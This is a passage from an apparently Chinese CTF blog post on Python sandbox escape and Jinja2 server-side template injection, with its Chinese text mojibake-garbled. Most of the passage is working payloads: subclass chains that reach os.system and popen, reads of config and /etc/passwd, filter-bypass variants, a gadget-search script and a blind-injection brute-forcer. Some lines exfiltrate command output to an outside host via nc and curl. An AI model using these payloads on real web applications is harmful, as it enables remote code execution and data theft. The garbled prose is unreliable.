<pre><code class="hljs sqf"><span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__mro__</span>[<span class="hljs-number">2</span>].<span class="hljs-variable">__subclasses__</span>()[<span class="hljs-number">72</span>].<span class="hljs-variable">__init__</span>.<span class="hljs-variable">__globals__</span>[<span class="hljs-string">&#x27;os&#x27;</span>].system(<span class="hljs-string">&#x27;ls&#x27;</span>)

[].<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__base__</span>.<span class="hljs-variable">__subclasses__</span>()[<span class="hljs-number">72</span>].<span class="hljs-variable">__init__</span>.<span class="hljs-variable">__globals__</span>[<span class="hljs-string">&#x27;os&#x27;</span>].popen(<span class="hljs-string">&#x27;ls&#x27;</span>).read()</code></pre>
<p>osæ¨¡å—è¿˜æœ‰ä»<code>warnings.catch*warnings</code>æ¨¡å—å…¥æ‰‹çš„ï¼Œè€Œè¿™ä¸¤ä¸ªæ¨¡å—åˆ†åˆ«ä½äºå…ƒç»„ä¸­çš„59ï¼Œ60å·å…ƒç´ ã€‚<code>__init__</code>æ–¹æ³•ç”¨äºå°†å¯¹è±¡å®ä¾‹åŒ–ï¼Œåœ¨è¿™ä¸ªå‡½æ•°ä¸‹æˆ‘ä»¬å¯ä»¥é€šè¿‡<code>func\*globals</code>ï¼ˆæˆ–è€…<code>__globals**</code>ï¼‰çœ‹è¯¥æ¨¡å—ä¸‹æœ‰å“ªäº›globalså‡½æ•°ï¼ˆæ³¨æ„è¿”å›çš„æ˜¯å­—å…¸ï¼‰ï¼Œè€Œlinecacheå¯ç”¨äºè¯»å–ä»»æ„ä¸€ä¸ªæ–‡ä»¶çš„æŸä¸€è¡Œï¼Œè€Œè¿™ä¸ªå‡½æ•°å¼•ç”¨äº†osæ¨¡å—ã€‚äºæ˜¯è¿˜å¯ä»¥æŒ–æ˜åˆ°ç±»ä¼¼payload:</p>
<pre><code class="hljs sqf">[].<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__base__</span>.<span class="hljs-variable">__subclasses__</span>()[<span class="hljs-number">59</span>].<span class="hljs-variable">__init__</span>.<span class="hljs-variable">__globals__</span>[<span class="hljs-string">&#x27;linecache&#x27;</span>].<span class="hljs-variable">__dict__</span>[<span class="hljs-string">&#x27;os&#x27;</span>].system(<span class="hljs-string">&#x27;ls&#x27;</span>)

[].<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__base__</span>.<span class="hljs-variable">__subclasses__</span>()[<span class="hljs-number">59</span>].<span class="hljs-variable">__init__</span>.func_globals[<span class="hljs-string">&#x27;linecache&#x27;</span>].<span class="hljs-variable">__dict__</span>.values()[<span class="hljs-number">12</span>].system(<span class="hljs-string">&#x27;ls&#x27;</span>)</code></pre>
<h4 id="python3"><a class="header-anchor" href="#python3">ğŸ­</a>python3</h4>
<p>python2ä¸‹æœ‰fileè€Œåœ¨python3ä¸‹å·²ç»æ²¡æœ‰äº†ï¼Œæ‰€ä»¥æ˜¯ç›´æ¥ç”¨openã€‚python3çš„åˆ©ç”¨ä¸»è¦ç´¢å¼•åœ¨äº<code>__builtins__</code>ï¼Œæ‰¾åˆ°äº†å®ƒæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨å…¶ä¸­çš„evalã€openç­‰ç­‰æ¥æ‰§è¡Œæˆ‘ä»¬æƒ³è¦çš„æ“ä½œ,å¤§ä½¬æ”¹ç¼–çš„ä¸€ä¸ªé€’å½’è„šæœ¬ï¼š</p>
<pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">search</span>(<span class="hljs-params">obj, max_depth</span>):</span>

    visited_clss = []
    visited_objs = []

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">visit</span>(<span class="hljs-params">obj, path=<span class="hljs-string">&#x27;obj&#x27;</span>, depth=<span class="hljs-number">0</span></span>):</span>
        <span class="hljs-keyword">yield</span> path, obj

        <span class="hljs-keyword">if</span> depth == max_depth:
            <span class="hljs-keyword">return</span>

        <span class="hljs-keyword">elif</span> isinstance(obj, (int, float, bool, str, bytes)):
            <span class="hljs-keyword">return</span>

        <span class="hljs-keyword">elif</span> isinstance(obj, type):
            <span class="hljs-keyword">if</span> obj <span class="hljs-keyword">in</span> visited_clss:
                <span class="hljs-keyword">return</span>
            visited_clss.append(obj)
            <span class="hljs-comment">#print(obj) Enumerates the objects traversed</span>

        <span class="hljs-keyword">else</span>:
            <span class="hljs-keyword">if</span> obj <span class="hljs-keyword">in</span> visited_objs:
                <span class="hljs-keyword">return</span>
            visited_objs.append(obj)

        <span class="hljs-comment"># attributes</span>
        <span class="hljs-keyword">for</span> name <span class="hljs-keyword">in</span> dir(obj):
            <span class="hljs-keyword">try</span>:
                attr = getattr(obj, name)
            <span class="hljs-keyword">except</span>:
                <span class="hljs-keyword">continue</span>
            <span class="hljs-keyword">yield</span> <span class="hljs-keyword">from</span> visit(attr, <span class="hljs-string">&#x27;&#123;&#125;.&#123;&#125;&#x27;</span>.format(path, name), depth + <span class="hljs-number">1</span>)

        <span class="hljs-comment"># dict values</span>
        <span class="hljs-keyword">if</span> hasattr(obj, <span class="hljs-string">&#x27;items&#x27;</span>) <span class="hljs-keyword">and</span> callable(obj.items):
            <span class="hljs-keyword">try</span>:
                <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> obj.items():
                    <span class="hljs-keyword">yield</span> <span class="hljs-keyword">from</span> visit(v, <span class="hljs-string">&#x27;&#123;&#125;[&#123;&#125;]&#x27;</span>.format(path, repr(k)), depth)
            <span class="hljs-keyword">except</span>:
                <span class="hljs-keyword">pass</span>

        <span class="hljs-comment"># items</span>
        <span class="hljs-keyword">elif</span> isinstance(obj, (set, list, tuple, frozenset)):
            <span class="hljs-keyword">for</span> i, v <span class="hljs-keyword">in</span> enumerate(obj):
                <span class="hljs-keyword">yield</span> <span class="hljs-keyword">from</span> visit(v, <span class="hljs-string">&#x27;&#123;&#125;[&#123;&#125;]&#x27;</span>.format(path, repr(i)), depth)

    <span class="hljs-keyword">yield</span> <span class="hljs-keyword">from</span> visit(obj)


num = <span class="hljs-number">0</span>
<span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">-1</span>].__subclasses__():
    <span class="hljs-keyword">try</span>:
        <span class="hljs-keyword">if</span> item.__init__.__globals__.keys():
            <span class="hljs-keyword">for</span> path, obj <span class="hljs-keyword">in</span> search(item,<span class="hljs-number">5</span>):
                <span class="hljs-keyword">if</span> obj <span class="hljs-keyword">in</span> (<span class="hljs-string">&#x27;__builtins__&#x27;</span>,<span class="hljs-string">&#x27;os&#x27;</span>,<span class="hljs-string">&#x27;eval&#x27;</span>):
                    print(<span class="hljs-string">&#x27;[+] &#x27;</span>,item,num,path)

        num+=<span class="hljs-number">1</span>
    <span class="hljs-keyword">except</span>:
        num+=<span class="hljs-number">1</span></code></pre>
<p>å¦å¤–pyhonæ‰§è¡Œå‘½ä»¤çš„æ–¹å¼è¿˜æœ‰subprocessã€commandç­‰ç­‰ï¼Œæ§åˆ¶é€’å½’æ·±åº¦ï¼Œå¯ä»¥æŒ–æ˜åˆ°æ›´å¤špayloadã€‚</p>
<h4 id="å¸¸ç”¨payload"><a class="header-anchor" href="#å¸¸ç”¨payload">ğŸ­</a>å¸¸ç”¨payload</h4>
<h6 id="è·å–åŸºæœ¬ç±»"><a class="header-anchor" href="#è·å–åŸºæœ¬ç±»">ğŸ­</a>è·å–åŸºæœ¬ç±»</h6>
<p><code>â€˜â€˜.__class__.__mro__[2]</code></p>
<p><code>&#123;&#125;.__class__.__bases__[0]</code></p>
<p><code>().__class__.__bases__[0]</code></p>
<p><code>[].__class__.__bases__[0]</code></p>
<p><code>request.__class__.__mro__[8]</code></p>
<h6 id="æŸ¥çœ‹è®¾ç½®ä¸­çš„å˜é‡"><a class="header-anchor" href="#æŸ¥çœ‹è®¾ç½®ä¸­çš„å˜é‡">ğŸ­</a>æŸ¥çœ‹è®¾ç½®ä¸­çš„å˜é‡</h6>
<p><code>&#123;  &#123; config &#125;  &#125;</code></p>
<p><code>&#123; &#123; url_for.__globals__[â€˜current_appâ€˜].config[â€˜flagâ€˜] &#125; &#125;</code></p>
<p><code>&#123; &#123; get_flashed_messages.__globals__[â€˜current_appâ€˜].config[â€˜flagâ€˜] &#125; &#125;</code></p>
<h6 id="æŸ¥çœ‹æ¨¡æ¿ä¸­çš„å˜é‡-å†…å®¹"><a class="header-anchor" href="#æŸ¥çœ‹æ¨¡æ¿ä¸­çš„å˜é‡-å†…å®¹">ğŸ­</a>æŸ¥çœ‹æ¨¡æ¿ä¸­çš„å˜é‡/å†…å®¹</h6>
<p><code>&#123; &#123; self.__dict__ &#125; &#125;</code></p>
<h6 id="æŸ¥çœ‹æ–‡ä»¶å¤¹ä¸­çš„æ–‡ä»¶"><a class="header-anchor" href="#æŸ¥çœ‹æ–‡ä»¶å¤¹ä¸­çš„æ–‡ä»¶">ğŸ­</a>æŸ¥çœ‹æ–‡ä»¶å¤¹ä¸­çš„æ–‡ä»¶</h6>
<p><code>&#123; &#123;â€˜â€˜.__class__.__mro__[-1].__subclasses__()[71].__init__.__globals__[â€˜osâ€˜].listdir(â€˜./â€˜)&#125; &#125;</code></p>
<h6 id="æ–‡ä»¶è¯»å–"><a class="header-anchor" href="#æ–‡ä»¶è¯»å–">ğŸ­</a>æ–‡ä»¶è¯»å–</h6>
<p><code>â€˜â€˜.__class__.__mro__[-1].__subclasses__()[40](â€˜filenameâ€˜).read()</code></p>
<p>æ‰§è¡Œå‘½ä»¤ <code>â€˜â€˜.__class__.__mro__.__getitem__(2).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(â€˜lsâ€˜).read()</code></p>
<h3 id="æ— å›æ˜¾å¤„ç†"><a class="header-anchor" href="#æ— å›æ˜¾å¤„ç†">ğŸ­</a>æ— å›æ˜¾å¤„ç†</h3>
<blockquote>
<p>ncè½¬å‘</p>
<blockquote>
<pre><code class="hljs sqf">&gt;&gt;vpsï¼šnc -lvp <span class="hljs-number">44444</span>
&gt;&gt;payload: <span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__mro__</span>[<span class="hljs-number">2</span>].<span class="hljs-variable">__subclasses__</span>()[<span class="hljs-number">72</span>].<span class="hljs-variable">__init__</span>.<span class="hljs-variable">__globals__</span>[<span class="hljs-string">&#x27;os&#x27;</span>].system(<span class="hljs-string">&#x27;ls | nc xx.xxx.xx.xx 44444&#x27;</span>)</code></pre>
<p>ä¹Ÿå¯ä»¥è€ƒè™‘ç›´æ¥åå¼¹äº¤äº’å‹shell</p>
</blockquote>
</blockquote>
<blockquote>
<p>dnslogè½¬å‘</p>
<blockquote>
<pre><code class="hljs autohotkey">&gt;curl `whoami`.xxxxxx</code></pre>
<p>å‚è€ƒ<a target="_blank" rel="noopener" href="http://www.smartredirect.de/redir/clickGate.php?u=IgKHHLBT&amp;m=1&amp;p=8vZ5ugFkSx&amp;t=vHbSdnLT&amp;st=&amp;s=&amp;url=https%3A%2F%2Fwww.cnblogs.com%2Fafanti%2Fp%2F8047530.html&amp;r=https%3A%2F%2Fwww.anquanke.com%2Fpost%2Fid%2F188172%23h3-10">å·§ç”¨DNSlogå®ç°æ— å›æ˜¾æ³¨å…¥</a><br>
å»ºç«‹æœ¬åœ°æ–‡ä»¶å†è¯»å–<br>
è¿™ä¸ªä¹Ÿå¾ˆå¥½ç†è§£ï¼Œé’ˆå¯¹systemæ— å›æ˜¾ï¼Œç›´æ¥æ‰§è¡Œ<code>ls &gt; a.txt</code>ï¼Œå†ç”¨openè¿›è¡Œè¯»å–</p>
</blockquote>
</blockquote>
<blockquote>
<p>curlä¸Šä¼ æ–‡ä»¶</p>
<blockquote>
<p>å‚è€ƒï¼š<a target="_blank" rel="noopener" href="http://admintony.com/%E6%97%A0%E5%9B%9E%E6%98%BE%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95.html">æ— å›æ˜¾ä»£ç æ‰§è¡Œåˆ©ç”¨æ–¹æ³•</a></p>
</blockquote>
</blockquote>
<blockquote>
<p>ç›²æ³¨<code>&#123; % if ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/test').read()[0:1]=='p' % &#125;~p0~&#123; % endif % &#125;</code>ç±»ä¼¼SQLå¸ƒå°”æ³¨å…¥ï¼Œé€šè¿‡æ˜¯å¦å›æ˜¾<sub>p0</sub>æ¥åˆ¤æ–­æ³¨å…¥æ˜¯å¦æˆåŠŸã€‚æ‰¾åˆ°è„šæœ¬å¦‚ä¸‹ï¼š</p>
<blockquote>
<pre><code class="hljs markdown">&gt;import requests

&gt;url = &#x27;http://127.0.0.1:8080/&#x27;

&gt;def check(payload):
&gt;postdata = &#123;
  &#x27;exploit&#x27;:payload
  &#125;
&gt;r = requests.post(url, data=postdata).content
&gt;return &#x27;~p0~&#x27; in r

&gt;password  = &#x27;&#x27;
&gt;s = r&#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!&quot;$&#x27;()<span class="hljs-emphasis">*+,-./:;<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">=</span>&gt;</span></span>?@[\]^`&#123;|&#125;~&#x27;&quot;_%&#x27;</span>
<span class="hljs-emphasis"></span>
<span class="hljs-emphasis">&gt;for i in xrange(0,100):</span>
<span class="hljs-emphasis">&gt;for c in s:</span>
<span class="hljs-emphasis">  payload = &#x27;&#123; % if &quot;&quot;.<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__mro__</span>[<span class="hljs-string">2</span>].<span class="hljs-strong">__subclasses__</span>()[<span class="hljs-string">40</span>](<span class="hljs-link">&quot;/tmp/test&quot;</span>).read()[&#x27;+str(i)+&#x27;:&#x27;+str(i+1)+&#x27;] == &quot;&#x27;+c+&#x27;&quot; % &#125;~p0~&#123; % endif % &#125;&#x27;</span>
<span class="hljs-emphasis">  if check(payload):</span>
<span class="hljs-emphasis">      password += c</span>
<span class="hljs-emphasis">      break</span>
<span class="hljs-emphasis">&gt;print password</span></code></pre>
</blockquote>
</blockquote>
<h3 id="SSTIæ§åˆ¶è¯­å¥"><a class="header-anchor" href="#SSTIæ§åˆ¶è¯­å¥">ğŸ­</a>SSTIæ§åˆ¶è¯­å¥</h3>
<p>åšé¢˜çš„æ—¶å€™é‡åˆ°SSTIï¼Œæˆ‘ä»¬è¦çŸ¥é“ä¸€ä¸ªpython-webæ¡†æ¶ä¸­å“ªäº›payloadå¯ç”¨ï¼Œä¸€ä¸ªä¸€ä¸ªå‘è¯·æ±‚æ‰‹åŠ¨æµ‹è¯•å°±å¤ªæ…¢ï¼Œè¿™é‡Œå°±éœ€è¦ç”¨æ¨¡æ¿çš„æ§åˆ¶è¯­å¥æ¥å†™ä»£ç æ“ä½œã€‚</p>
<pre><code class="hljs clojure">&#123; % for c in [].__class__.__base__.__subclasses__() % &#125;
&#123; % if c.__name__ == &#x27;catch_warnings&#x27; % &#125;
  &#123; % for b in c.__init__.__globals__.values() % &#125;
  &#123; % if b.__class__ == &#123;&#125;.__class__ % &#125;
    &#123; % if &#x27;eval&#x27; in b.keys() % &#125;
      &#123; &#123; b[&#x27;eval&#x27;](<span class="hljs-name">&#x27;__import__</span>(<span class="hljs-string">&quot;os&quot;</span>).popen(<span class="hljs-string">&quot;id&quot;</span>).read()&#x27;) &#125; &#125;
    &#123; % endif % &#125;
  &#123; % endif % &#125;
  &#123; % endfor % &#125;
&#123; % endif % &#125;
&#123; % endfor % &#125;</code></pre>
<p>æ ¹æ®å®é™…æƒ…å†µæ›´æ”¹ä»£ç ç›´æ¥å¯¹é¢˜ç›®ç¯å¢ƒæµ‹è¯•</p>
<h3 id="Bypass"><a class="header-anchor" href="#Bypass">ğŸ­</a>Bypass</h3>
<h5 id="æ‹¼æ¥"><a class="header-anchor" href="#æ‹¼æ¥">ğŸ­</a>æ‹¼æ¥</h5>
<pre><code class="hljs markdown">object.<span class="hljs-strong">__subclasses__</span>()[<span class="hljs-string">59</span>].<span class="hljs-strong">__init__</span>.func<span class="hljs-emphasis">_globals[<span class="hljs-string">&#x27;linecache&#x27;</span>].<span class="hljs-strong">__dict__</span>[<span class="hljs-string">&#x27;o&#x27;+&#x27;s&#x27;</span>].<span class="hljs-strong">__dict__</span>[<span class="hljs-string">&#x27;sy&#x27;+&#x27;stem&#x27;</span>](<span class="hljs-link">&#x27;ls&#x27;</span>)</span>
<span class="hljs-emphasis">().<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__bases__</span>[<span class="hljs-string">0</span>].<span class="hljs-strong">__subclasses__</span>()[<span class="hljs-string">40</span>](<span class="hljs-link">&#x27;r&#x27;,&#x27;fla&#x27;+&#x27;g.txt&#x27;</span>)).read()</span></code></pre>
<h5 id="ç¼–ç "><a class="header-anchor" href="#ç¼–ç ">ğŸ­</a>ç¼–ç </h5>
<pre><code class="hljs markdown">().<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__bases__</span>[<span class="hljs-string">0</span>].<span class="hljs-strong">__subclasses__</span>()[<span class="hljs-string">59</span>].<span class="hljs-strong">__init__</span>.<span class="hljs-strong">__globals__</span>.<span class="hljs-strong">__builtins__</span>[<span class="hljs-string">&#x27;eval&#x27;</span>](<span class="hljs-link">&quot;__import__(&#x27;os&#x27;</span>).popen(&#x27;ls&#x27;).read()&quot;)</code></pre>
<p>ç­‰ä»·äº</p>
<p><code>().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__['ZXZhbA=='.decode('base64')](&quot;X19pbXBvcnRfXygnb3MnKS5wb3BlbignbHMnKS5yZWFkKCk=&quot;.decode('base64'))</code>(å¯ä»¥çœ‹å‡ºå•åŒå¼•å·å†…çš„éƒ½å¯ä»¥ç¼–ç )</p>
<p>åŒç†è¿˜å¯ä»¥è¿›è¡Œrot13ã€16è¿›åˆ¶ç¼–ç ç­‰</p>
<h5 id="è¿‡æ»¤class"><a class="header-anchor" href="#è¿‡æ»¤class">ğŸ­</a>è¿‡æ»¤class</h5>
<p>ä½¿ç”¨session</p>
<pre><code class="hljs prolog">poc &#123; &#123;session[<span class="hljs-string">&#x27;__cla&#x27;</span>+<span class="hljs-string">&#x27;ss__&#x27;</span>].<span class="hljs-symbol">__bases__</span>[<span class="hljs-number">0</span>].<span class="hljs-symbol">__bases__</span>[<span class="hljs-number">0</span>].<span class="hljs-symbol">__bases__</span>[<span class="hljs-number">0</span>].<span class="hljs-symbol">__bases__</span>[<span class="hljs-number">0</span>].<span class="hljs-symbol">__subclasses__</span>()[<span class="hljs-number">118</span>]&#125; &#125;</code></pre>
<p>å¤šä¸ªbases[0]æ˜¯å› ä¸ºä¸€ç›´åœ¨å‘ä¸Šæ‰¾objectç±»ã€‚ä½¿ç”¨mroå°±ä¼šå¾ˆæ–¹ä¾¿</p>
<pre><code class="hljs clojure">&#123; &#123;session[&#x27;__cla&#x27;+&#x27;ss__&#x27;].__mro__[<span class="hljs-number">12</span>]&#125; &#125;</code></pre>
<p>æˆ–è€…</p>
<pre><code class="hljs clojure">&#123; &#123;request[&#x27;__cl&#x27;+&#x27;ass__&#x27;].__mro__[<span class="hljs-number">12</span>]&#125; &#125;</code></pre>
<h5 id="è¿‡æ»¤ä¸­æ‹¬å·"><a class="header-anchor" href="#è¿‡æ»¤ä¸­æ‹¬å·">ğŸ­</a>è¿‡æ»¤ä¸­æ‹¬å·[]</h5>
<p><strong>getitem()</strong></p>
<pre><code class="hljs python"><span class="hljs-string">&quot;&quot;</span>.__class__.__mro__[<span class="hljs-number">2</span>]
<span class="hljs-string">&quot;&quot;</span>.__class__.__mro__.__getitem__(<span class="hljs-number">2</span>)</code></pre>
<p><strong>pop()</strong></p>
<pre><code class="hljs gcode"><span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__.__getitem__<span class="hljs-comment">(2)</span>.__subclasses__<span class="hljs-comment">()</span>.pop<span class="hljs-comment">(40)</span><span class="hljs-comment">(&#x27;/etc/passwd&#x27;)</span>.read<span class="hljs-comment">()</span></code></pre>
<p><strong>å­—å…¸è¯»å–</strong></p>
<pre><code class="hljs python">__builtins__[<span class="hljs-string">&#x27;eval&#x27;</span>]()
__builtins__.eval()</code></pre>
<p>ç»è¿‡æµ‹è¯•è¿™ç§æ–¹æ³•åœ¨pythonè§£é‡Šå™¨é‡Œä¸èƒ½æ‰§è¡Œï¼Œä½†æ˜¯åœ¨æµ‹è¯•çš„é¢˜ç›®ç¯å¢ƒä¸‹å¯ä»¥æ‰§è¡Œ</p>
<h5 id="è¿‡æ»¤å¼•å·"><a class="header-anchor" href="#è¿‡æ»¤å¼•å·">ğŸ­</a>è¿‡æ»¤å¼•å·</h5>
<p>å…ˆè·å–chrå‡½æ•°ï¼Œèµ‹å€¼ç»™chrï¼Œåé¢æ‹¼æ¥å­—ç¬¦ä¸²</p>
<pre><code class="hljs hy">&#123; % set chr=().__class__.__bases__.__getitem__(<span class="hljs-number">0</span>).__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__.__builtins__.chr % &#125; &#123; &#123; ().__class__.__bases__.__getitem__(<span class="hljs-number">0</span>).__subclasses__().pop(<span class="hljs-number">40</span>)(<span class="hljs-name"><span class="hljs-builtin-name">chr</span></span>(<span class="hljs-number">47</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-number">101</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-number">116</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-number">99</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-number">47</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-number">112</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-number">97</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-number">115</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-number">115</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-number">119</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-number">100</span>)).read() &#125; &#125;</code></pre>
<p>æˆ–è€…å€ŸåŠ©requestå¯¹è±¡ï¼šï¼ˆè¿™ç§æ–¹æ³•åœ¨æ²™ç›’ç§ä¸è¡Œï¼Œåœ¨webä¸‹æ‰è¡Œï¼Œå› ä¸ºéœ€è¦ä¼ å‚ï¼‰</p>
<pre><code class="hljs gcode">&#123; &#123; <span class="hljs-comment">()</span>.__class__.__bases__.__getitem__<span class="hljs-comment">(0)</span>.__subclasses__<span class="hljs-comment">()</span>.pop<span class="hljs-comment">(40)</span><span class="hljs-comment">(request.args.path)</span>.read<span class="hljs-comment">()</span> &#125; &#125;&amp;path=/etc/passwd</code></pre>
<p><strong>PSï¼šå°†å…¶ä¸­çš„request.argsæ”¹ä¸ºrequest.valuesåˆ™åˆ©ç”¨postçš„æ–¹å¼è¿›è¡Œä¼ å‚</strong></p>
<p>æ‰§è¡Œå‘½ä»¤ï¼š</p>
<pre><code class="hljs reasonml">&#123; % set chr=<span class="hljs-literal">()</span>.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__class__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__bases__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__getitem__</span>(</span></span><span class="hljs-number">0</span>).<span class="hljs-constructor">__subclasses__()</span><span class="hljs-literal">[<span class="hljs-number">59</span>]</span>.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__init__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__globals__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__builtins__</span>.</span></span>chr % &#125; &#123; &#123; <span class="hljs-literal">()</span>.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__class__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__bases__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__getitem__</span>(</span></span><span class="hljs-number">0</span>).<span class="hljs-constructor">__subclasses__()</span>.pop(<span class="hljs-number">59</span>).<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__init__</span>.</span></span>func_globals.linecache.os.popen(chr(<span class="hljs-number">105</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-number">100</span>)).read<span class="hljs-literal">()</span> &#125; &#125;
&#123; &#123;<span class="hljs-literal">()</span>.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__class__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__bases__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__getitem__</span>(</span></span><span class="hljs-number">0</span>).<span class="hljs-constructor">__subclasses__()</span>.pop(<span class="hljs-number">59</span>).<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__init__</span>.</span></span>func_globals.linecache.os.popen(request.args.cmd).read<span class="hljs-literal">()</span> &#125; &#125;&amp;cmd=id</code></pre>
<h5 id="è¿‡æ»¤åŒä¸‹åˆ’çº¿"><a class="header-anchor" href="#è¿‡æ»¤åŒä¸‹åˆ’çº¿">ğŸ­</a>è¿‡æ»¤åŒä¸‹åˆ’çº¿__</h5>
<pre><code class="hljs markdown">&#123; &#123; &#x27;&#x27;[<span class="hljs-string">request.args.class</span>][<span class="hljs-symbol">request.args.mro</span>][<span class="hljs-string">2</span>][<span class="hljs-symbol">request.args.subclasses</span>]()[<span class="hljs-string">40</span>](<span class="hljs-link">&#x27;/etc/passwd&#x27;</span>).read() &#125; &#125;&amp;class=<span class="hljs-strong">__class__</span>&amp;mro=<span class="hljs-strong">__mro__</span>&amp;subclasses=<span class="hljs-strong">__subclasses__</span></code></pre>
<h5 id="è¿‡æ»¤"><a class="header-anchor" href="#è¿‡æ»¤">ğŸ­</a>è¿‡æ»¤{ {</h5>
<pre><code class="hljs clojure">&#123; % if &#x27;&#x27;.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__.func_globals.linecache.os.popen(<span class="hljs-name">&#x27;curl</span> http://xx.xxx.xx.xx:8080/?i=`whoami`&#x27;).read()==&#x27;p&#x27; % &#125;<span class="hljs-number">1</span>&#123; % endif % &#125;</code></pre>
<h5 id="reloadæ–¹æ³•"><a class="header-anchor" href="#reloadæ–¹æ³•">ğŸ­</a>reloadæ–¹æ³•</h5>
<p>CTFé¢˜ä¸­æ²™ç›’ç¯å¢ƒå¯èƒ½ä¼šé˜‰å‰²ä¸€äº›æ¨¡å—ï¼Œå…¶ä¸­å†…å»ºå‡½æ•°ä¸­å¤šåŠä¼šè¢«åˆ é™¤ã€‚å¦‚æœreloadè¿˜å¯ä»¥ç”¨åˆ™å¯ä»¥é‡è½½</p>
<pre><code class="hljs sqf">del <span class="hljs-variable">__builtins__</span>.<span class="hljs-variable">__dict__</span>[<span class="hljs-string">&#x27;__import__&#x27;</span>]
del <span class="hljs-variable">__builtins__</span>.<span class="hljs-variable">__dict__</span>[<span class="hljs-string">&#x27;eval&#x27;</span>]
del <span class="hljs-variable">__builtins__</span>.<span class="hljs-variable">__dict__</span>[<span class="hljs-string">&#x27;execfile&#x27;</span>]


<span class="hljs-built_in">reload</span>(<span class="hljs-variable">__builtins__</span>)</code></pre>
<h5 id="getattribute-æ–¹æ³•"><a class="header-anchor" href="#getattribute-æ–¹æ³•">ğŸ­</a><code>__getattribute__</code>æ–¹æ³•</h5>
<p>è¿™ä¸ªæ–¹æ³•ä¹‹å‰ä»‹ç»è¿‡äº†ï¼Œè·å–å±æ€§ã€‚</p>
<pre><code class="hljs python">[].__class__.__base__.__subclasses__()[<span class="hljs-number">60</span>].__init__.__getattribute__(<span class="hljs-string">&#x27;func_global&#x27;</span>+<span class="hljs-string">&#x27;s&#x27;</span>)[<span class="hljs-string">&#x27;linecache&#x27;</span>].__dict__.values()[<span class="hljs-number">12</span>]
<span class="hljs-comment"># ç­‰ä»·äº</span>
[].__class__.__base__.__subclasses__()[<span class="hljs-number">60</span>].__init__.func_globals[<span class="hljs-string">&#x27;linecache&#x27;</span>].__dict__.values()[<span class="hljs-number">12</span>]</code></pre>
<h5 id="ä¸åˆ©ç”¨-globals"><a class="header-anchor" href="#ä¸åˆ©ç”¨-globals">ğŸ­</a>ä¸åˆ©ç”¨<code>__globals__</code></h5>
<pre><code class="hljs python">[].__class__.__base__.__subclasses__()[<span class="hljs-number">59</span>]()._module.linecache.os.system(<span class="hljs-string">&#x27;ls&#x27;</span>)</code></pre>
<h5 id="timeit"><a class="header-anchor" href="#timeit">ğŸ­</a>timeit</h5>
<pre><code class="hljs python"><span class="hljs-keyword">import</span> timeit
timeit.timeit(<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).system(&#x27;dir&#x27;)&quot;</span>,number=<span class="hljs-number">1</span>)</code></pre>
<h5 id="platform"><a class="header-anchor" href="#platform">ğŸ­</a>platform</h5>
<pre><code class="hljs python"><span class="hljs-keyword">import</span> platform
<span class="hljs-keyword">print</span> platform.popen(<span class="hljs-string">&#x27;dir&#x27;</span>).read()</code></pre>
<h2 id="æ€»ç»“"><a class="header-anchor" href="#æ€»ç»“">ğŸ­</a>æ€»ç»“</h2>
<p>sstiæœ‰ç‚¹å¹¿ï¼Œè¿™é‡Œæåˆ°çš„ä¸€äº›payloadæ˜¯ä¸ªå¤§ä½“ç»“æ„ï¼Œé‡åˆ°é¢˜ç›®è¦è§†æƒ…å†µæ”¹ç¼–payloadè¿›è¡Œæµ‹è¯•</p>
<p>å‚è€ƒï¼š</p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/188172#h3-10">SSTI/æ²™ç›’é€ƒé€¸è¯¦æƒ…æ€»ç»“</a></p>
